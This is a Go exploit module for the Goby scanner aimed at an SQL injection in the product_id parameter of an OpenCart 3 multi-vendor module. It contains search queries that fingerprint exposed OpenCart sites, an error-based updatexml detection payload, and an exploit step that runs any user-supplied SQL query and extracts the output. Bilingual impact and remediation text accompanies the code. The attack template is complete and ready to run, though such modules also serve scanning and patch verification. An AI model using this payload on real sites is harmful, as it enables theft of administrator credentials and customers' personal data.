package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Opencart 3 multi-vendor module product_id parameter SQL injection vulnerability",
    "Description": "<p>The OpenCart multi vendor module is an online marketplace designed to assist OpenCart store owners and the OpenCart community.</p><p>The product_id of the /index.php?route=product/product interface of the multi-vendor module in Opencart 3 has a SQL injection vulnerability due to improper parameter filtering.</p>",
    "Product": "OpenCart",
    "Homepage": "http://www.opencart.com/",
    "DisclosureDate": "2021-11-04",
    "Author": "sharecast",
    "FofaQuery": "body=\"powered by OpenCart\" || body=\"via PayPal to donate@opencart.com\" || body=\"/css/opencart.css\" || header=\"OCSESSID=\" || banner=\"OCSESSID=\"",
    "GobyQuery": "body=\"powered by OpenCart\" || body=\"via PayPal to donate@opencart.com\" || body=\"/css/opencart.css\" || header=\"OCSESSID=\" || banner=\"OCSESSID=\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released a patch, please continue to pay attention to the official updates:</p><p><a href=\"https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace\">https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace</a></p><p>Temporary fix suggested:</p><p>1. Use WAF to protect the website, you can use open source WAF such as modsecurity;</p><p>2. Judge the parameter type, strictly limit the parameter type, and use the parameterized query interface.</p>",
    "References": [
        "https://www.exploit-db.com/exploits/50493"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select+database()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?route=product/product&product_id=1%27and+updatexml(1,concat(0x7e,(select+md5(0x5c)),0x7e),1)%23",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "28d397e87306b8631f",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php?route=product/product&product_id=1%27and+updatexml(1,concat(0x7e,({{{sql}}}),0x7e),1)%23",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~(.*?)~"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Opencart 3 多供应商模块 product_id 参数 SQL 注入漏洞",
            "Product": "OpenCart",
            "Description": "<p>OpenCart 多供应商模块是一个在线市场，旨在帮助 OpenCart 商店所有者和 OpenCart 社区。因此，该模块使商店所有者能够扩展他们的在线业务。</p><p>在Opencart 3 中的多供应商模块 /index.php?route=product/product接口的product_id由于参数过滤不当导致存在SQL注入漏洞。</p>",
            "Recommendation": "<p>目前厂商未发布补丁，请持续关注官方更新动态：</p><p><a href=\"https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace\">https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace</a></p><p>临时修复建议：</p><p>1、使用WAF对网站进行防护，可以使用modsecurity等开源WAF;</p><p>2、将参数类型进行判断，严格限制参数类型，并使用参数化查询接口。</p>",
            "Impact": "<p>\t攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Opencart 3 multi-vendor module product_id parameter SQL injection vulnerability",
            "Product": "OpenCart",
            "Description": "<p>The OpenCart multi vendor module is an online marketplace designed to assist OpenCart store owners and the OpenCart community.</p><p>The product_id of the /index.php?route=product/product interface of the multi-vendor module in Opencart 3 has a SQL injection vulnerability due to improper parameter filtering.</p>",
            "Recommendation": "<p>At present, the manufacturer has not released a patch, please continue to pay attention to the official updates:</p><p><a href=\"https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace\">https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace</a></p><p>Temporary fix suggested:</p><p>1. Use WAF to protect the website, you can use open source WAF such as modsecurity;</p><p>2. Judge the parameter type, strictly limit the parameter type, and use the parameterized query interface.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}